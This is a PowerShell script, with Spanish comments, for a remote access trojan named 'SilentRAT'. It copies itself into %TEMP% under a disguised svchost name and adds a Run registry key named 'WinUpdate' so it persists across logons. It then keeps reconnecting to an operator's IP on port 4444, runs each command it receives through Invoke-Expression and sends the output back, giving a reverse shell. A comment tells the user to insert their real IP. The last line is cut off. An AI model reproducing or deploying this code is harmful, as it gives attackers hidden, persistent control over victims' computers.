# --- CONFIGURACIÓN ---
$ServerIP = "192.168.1.19" # <--- PON TU IP REAL AQUÍ
$Port = 4444
# ---------------------

function Start-SilentRAT {
    # Persistencia: Copiar a %TEMP% y añadir al registro
    $TempPath = "$env:TEMP\svchost_update.exe"
    if (-not (Test-Path $TempPath)) {
        Copy-Item $MyInvocation.MyCommand.Path -Destination $TempPath -Force
        $ScriptPath = "powershell.exe -ExecutionPolicy Bypass -File `"$TempPath`""
        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdate" -Value $ScriptPath -Force | Out-Null
    }

    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($ServerIP, $Port)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)

            while ($true) {
                $cmd = $reader.ReadLine()
                if ([string]::IsNullOrEmpty($cmd)) { break }
                
                # Ejecutar comando y capturar salida silenciosamente
                $result = Invoke-Expression $cmd 2>&1
                
                # Enviar resultado
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($result)
                $stream.Write($bytes, 0, $bytes.Length)
                $stream.Flush()
            }
            $client.Close()
        } catch {
            Start-Sleep -Seconds 5
        }
    }
}

Start-SilentR